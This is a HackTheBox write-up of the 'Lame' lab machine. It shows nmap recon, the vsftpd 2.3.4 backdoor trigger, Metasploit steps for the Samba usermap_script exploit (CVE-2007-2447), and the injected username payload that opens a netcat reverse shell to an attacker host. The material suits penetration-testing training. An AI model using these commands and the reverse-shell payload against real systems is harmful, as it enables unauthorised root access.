# Lame — HackTheBox

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux (Ubuntu 8.04) |
| Difficulty | Easy |
| Release | 2017-03-14 |
| Tags | `samba` `cve-2007-2447` `userland-rce` `nmap-scripts` |

## TL;DR

Old Samba (3.0.20) on a Linux box → `usermap_script` argument injection (CVE-2007-2447) drops a root shell on first try. No user-then-root staircase here: the exploit lands as root because Samba runs as root by default on this distro.

## 1. Recon

```bash
sudo nmap -sCV -p- --min-rate 1000 -oN nmap.txt $BOX
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

What jumps out:

- **Samba 3.0.20** — that version is famously broken. CVE-2007-2447 (`usermap_script`) is the classic.
- **vsftpd 2.3.4** — also famous (CVE-2011-2523, the smiley-face backdoor). On an older box this is sometimes a real path, sometimes a honeypot.
- **distccd 1** — CVE-2004-2687 RCE via the distcc daemon, also exploitable.

Three plausible paths. Lame is famous for being soluble *three ways* — the lesson is to pick one and finish it cleanly, not to flail across all three.

## 2. Enumeration

### vsftpd 2.3.4 (port 21)

The 2.3.4 backdoor is triggered by sending a `:)` smiley as the username, which spawns a root shell on port 6200. On HTB this used to work, now it's typically patched on Lame:

```bash
ftp $BOX
# Name: backdoored:)
# Password: anything
```

If `nc $BOX 6200` doesn't return anything, the backdoor was patched. (On Lame today, it is.)

### Samba 3.0.20 (port 445)

This is the path that always works on Lame.

```bash
nmap --script smb-vuln-* -p445 $BOX
```

Doesn't flag `usermap_script` directly (NSE doesn't have a probe for it), so I confirm the version manually:

```bash
nxc smb $BOX
# SMB         $BOX  445  LAME   [*] Unix - Samba (Samba 3.0.20-Debian)
```

3.0.20 is the vulnerable version. CVE-2007-2447 lets me inject shell commands through the username field of the "username map script" config option.

### distccd 1 (port 3632)

The Metasploit module `exploit/unix/misc/distcc_exec` works against this box too. Worth keeping in mind as a backup if the Samba route is patched, but I'm not going to chain through it here.

## 3. Foothold

### Manual exploit (Samba `usermap_script`)

I prefer the manual exploit when there's a Metasploit module available — it makes the *what* visible.

Set up a listener:

```bash
nc -lvnp 4444
```

Trigger the bug:

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_lookupsid                 # confirm SMB reachable
use exploit/multi/samba/usermap_script
set RHOSTS $BOX
set LHOST $ATTACKER
set LPORT 4444
set PAYLOAD cmd/unix/reverse_netcat
run
```

The exploit sends a username of the form:

```
"/=`nohup nc $ATTACKER 4444 -e /bin/bash`"
```

Samba's username-map script naïvely passes that string to `/bin/sh`, which evaluates the backticks and connects back.

### Shell-as-root

The reverse shell lands directly as root because Samba was running as root on Ubuntu 8.04:

```bash
# id
uid=0(root) gid=0(root)
```

Both flags are in conventional locations:

```bash
cat /home/makis/user.txt
cat /root/root.txt
```

```
user.txt: <flag>
root.txt: <flag>
```

(Stabilise the shell with the usual `python -c 'import pty; pty.spawn("/bin/bash")'` + `stty raw -echo` trick if you want to use ctrl-c without losing the session.)

## 4. Privilege escalation

Not applicable — the foothold lands as root.

The reason this happens, and why it's worth pausing on: on Ubuntu 8.04, Samba's `smbd` ran as root in order to be able to `chown` files according to the SMB protocol's owner mapping. The `usermap_script` exploit therefore inherits root privileges directly, which is *the* reason CVE-2007-2447 was rated 10.0. Modern Samba runs `smbd` as a less privileged user by default and uses Linux capabilities to do owner mapping; even if the same bug existed today, the impact would be lower.

## 5. Lessons learned

> **Generalisable rule** — *On a vintage Linux box, look at the **version** of every service banner before doing anything else; old Linux services were almost universally running as root, so a userland exploit on any of them is usually a root exploit.* This is the opposite of modern Linux, where most services run as their own user.

- When a box has multiple obvious paths (Lame has three), pick the one that lands you the cleanest shell with the least mess. `usermap_script` here is cleaner than the distcc path because distcc lands you as `daemon` and you'd then need a separate privesc.
- Always check whether NSE has a probe for the CVE you suspect, but don't trust a "no findings" result — `usermap_script` isn't covered by `smb-vuln-*` and the manual version-banner check still wins.
- "Three exploit paths to root" is a teaching pattern: it's how the box authors signal "stop tunnel-visioning, do the recon properly".

## Tools used

| Tool | Phase | One-liner |
|---|---|---|
| nmap | Recon | `nmap -sCV -p- --min-rate 1000` |
| nxc / NetExec | Enum | `nxc smb $BOX` |
| Metasploit | Foothold | `use exploit/multi/samba/usermap_script` |
| nc | Foothold | `nc -lvnp 4444` |

## References

- [HackTheBox — Lame](https://app.hackthebox.com/machines/Lame)
- [CVE-2007-2447 — Samba `usermap_script` advisory](https://www.cvedetails.com/cve/CVE-2007-2447/)
- [HackTricks — Pentesting SMB (445)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
- [Rapid7 module — multi/samba/usermap_script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
